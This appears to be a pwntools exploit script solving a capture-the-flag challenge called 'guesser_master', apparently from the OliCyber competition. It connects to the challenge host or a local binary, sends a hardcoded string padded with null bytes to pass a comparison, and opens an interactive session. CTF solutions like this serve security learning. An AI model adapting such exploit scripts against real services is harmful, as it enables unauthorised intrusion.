from pwn import * 

elf = context.binary = ELF('./guesser_master')
context.terminal = ()

if args.REMOTE:
    p = remote('guessermaster.challs.olicyber.it',35006)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b main
        c
    ''')
else:
    p = elf.process()

right_string = 'ILCPSKLRYVMCPJNBPBWLLSREHFMXRKECWITRSGLREXVTJMXYPUNBQFGXMUVGFAJCLFVENHYUHUORJOSAMIBDNJDBEYHKBSOMBLTOUUJDRBWCRRCGBFLQPOTTPEGRWVGAJCRGWDLPGITYDVHEDTUSIPPYVXSUVBVFENODQASAJOYOMGSQCPJLHBMDAHYVIUEMKSSDSLDEBESNNNGPESDNTRRVYSUIPYWATPFOELTHROWHFEXLWDYSVSPWLKFBLFD'

p.sendlineafter(b': ', right_string.encode() + b'\x00'*5)
p.interactive()